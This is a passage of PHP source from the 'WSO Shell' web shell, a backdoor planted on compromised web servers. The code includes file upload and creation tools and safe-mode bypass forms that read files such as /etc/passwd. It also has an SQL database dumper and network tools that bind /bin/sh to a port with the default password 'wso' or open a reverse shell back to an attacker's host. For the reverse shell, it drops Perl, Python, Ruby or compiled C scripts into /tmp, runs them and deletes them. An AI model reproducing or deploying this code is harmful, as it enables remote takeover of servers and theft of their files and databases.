...
body,td,th    {font:9pt Lucida Console,Tahoma;margin:0;vertical-align:top;color:" . $color . ";}
...
input, textarea, select    {margin:0;color:#fff;background-color:#000;border:1px solid " . $color . "; font:9pt Monospace,'Courier New';}
form        {margin:0px;}
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
    ...
    <tr>
        ...
        <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
    </tr>
    <tr>
        ...
        <span>Upload file:</span><br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
    </tr>
</table></div></body></html>";
}
...
function actionSafeMode() {
    ...
    echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Include</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix (read /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form><br><br><span>Imap (read file)</span><form onsubmit=\'g(null,null,"6",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form>';
    if($temp)
...
function actionSql() {
    ...
    if(@$_POST['p2']=='download') {
        ...
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename='.$_POST['sql_base'].'_dump.sql');
...
<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
    ...
    echo "</td>
        ...
        <script>
            function fs(f) {
                if(f.sql_base.value!=''&&f.p1.value!='drop')
                    f.p1.value='query';
            }
            function st(t,l) {
                d.sf.p1.value = 'select';
                d.sf.p2.value = t;
                if(l && d.sf.p1.value == 'select')
                    d.sf.p1.value = 'dump';
                d.sf.submit();
            }
            function is() {
...
function actionNetwork() {
    ...
    $bind_port_p="";
    ...
    $bind_port_c="";

    echo '<h1>Network tools</h1><div class=content>
    <form name=\'nfp\' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
    <span>Bind port to /bin/sh</span><br/>
    Port: <input type=\'text\' name=\'port\' value=\'7777\'> Password: <input type=\'text\' name=\'pass\' value=\'wso\'> Using: <select name="using"><option value=\'php\'>PHP</option><option value=\'perl\'>Perl</option><option value=\'python\'>Python</option><option value=\'ruby\'>Ruby</option><option value=\'c\'>C</option></select><input type=submit value=">>">
    </form>
    <form name=\'nfp2\' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
    <span>Back-connect to</span><br/>
    Server: <input type=\'text\' name=\'server\' value="'. $_SERVER['REMOTE_ADDR'] .'"> Port: <input type=\'text\' name=\'port\' value=\'7777\'> Using: <select name="using"><option value=\'php\'>PHP</option><option value=\'perl\'>Perl</option><option value=\'python\'>Python</option><option value=\'ruby\'>Ruby</option><option value=\'c\'>C</option></select><input type=submit value=">>">
    </form><br>';
    ...
    if(isset($_POST['p1'])) {
        ...
        if($_POST['p1'] == 'perl') {
            ...
            $out = wsoEx("perl /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
        }
        if($_POST['p1'] == 'python') {
            cf("/tmp/bc.py",$back_connect_p);
            $out = wsoEx("python /tmp/bc.py ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.py")."</pre>";
            unlink("/tmp/bc.py");
        }
        if($_POST['p1'] == 'ruby') {
            cf("/tmp/bc.rb",$back_connect_p);
            $out = wsoEx("ruby /tmp/bc.rb ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc.rb")."</pre>";
            unlink("/tmp/bc.rb");
        }
        if($_POST['p1'] == 'c') {
            cf("/tmp/bc.c",$back_connect_c);
            $out = wsoEx("gcc -o /tmp/bc /tmp/bc.c");
            @unlink("/tmp/bc.c");
            $out .= wsoEx("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
            echo "<pre class=ml1>$out\n".wsoEx("ps aux | grep bc")."</pre>";
            @unlink("/tmp/bc");
        }
        if($_POST['p1'] == 'php') {
            $ip = $_POST['p2'];
            ...
            if($errno != 0) {
                ...
                $result = "<p>Unexpected error has occurred, connection may have failed.</p>";
            } else {
                fputs ($sockfd ,"\n{################################################################}\n..:: WSO Shell ::..\n\n=> Backconnect\n=> Back Server : ".$ip."\n=> Back Port   : ".$port."\n\n{################################################################}\n\n");
                $dir = shell_exec("pwd");
